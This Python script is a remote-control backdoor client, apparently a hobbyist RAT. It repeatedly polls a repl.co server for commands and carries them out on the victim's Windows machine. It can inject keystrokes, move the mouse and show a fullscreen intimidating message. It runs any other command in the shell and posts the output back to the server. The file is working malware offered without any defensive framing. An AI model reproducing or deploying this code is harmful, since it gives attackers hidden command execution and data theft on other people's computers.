import requests, json, os, random
from pynput.keyboard import Controller as kbdCtrl
from pynput.keyboard import Key
import pyautogui
import tkinter
from tkinter import *
from tkinter import messagebox
import threading

url = "https://DINO-INO.scihack.repl.co"
# data_ = requests.get(url)

info_send = 0
kbd = kbdCtrl()
while 1:
    try:
        if info_send == 0:
            requests.post(url+"/setSlaveMessage", json.dumps({"msg": "\nready to exploit!\n", "type": "info"}))
            info_send += 1
            
        cur_cmd = json.loads(requests.post(url+"/getCurrentCMD", "DINO").text)
        print(cur_cmd)
        if cur_cmd["CMD"] != None:
            if cur_cmd["CMD"].startswith("typeText"):
                to_type = cur_cmd["CMD"].replace("typeText ", "").replace("typeText", "")
                for chars in to_type:
                    if chars == " ":
                        kbd.press(Key.space)
                        kbd.release(Key.space)
                    else:
                        kbd.press(chars)
                        kbd.release(chars)
            
            elif cur_cmd["CMD"] == "traceMouse.begin":
                if "position" in cur_cmd:
                    pyautogui.moveTo(cur_cmd["position"])
                    # print("moved at ", cur_cmd["position"])

            elif cur_cmd["CMD"].startswith("showMSG"):
                root = tkinter.Tk()
                root.title("Listen Me")
                root.attributes("-topmost", True)
                root.attributes("-fullscreen", True)
                root.attributes("-alpha", 0.5)
                root.config(bg="red")
                messagebox.showinfo("Lord's msg", cur_cmd["CMD"].replace("showMSG ", "").replace("showMSG", ""))
                root.destroy()
                root.mainloop()

            else:
                def executeOnSystem():
                    temp_fname = f'{os.environ["homedrive"]}\\{os.environ["homepath"]}\\{random.randint(int(1e+5), int(1e+6))}.info'
                    os.system(f'{cur_cmd["CMD"]} > {temp_fname}')
                    with open(temp_fname, "r") as fp:
                        data_ = fp.read()
                    os.remove(temp_fname)
                    requests.post(url+"/setSlaveMessage", json.dumps({"msg": data_, "type": "Command output"}))
                threading.Thread(target=executeOnSystem).start()
    except BaseException as e:
        print(e)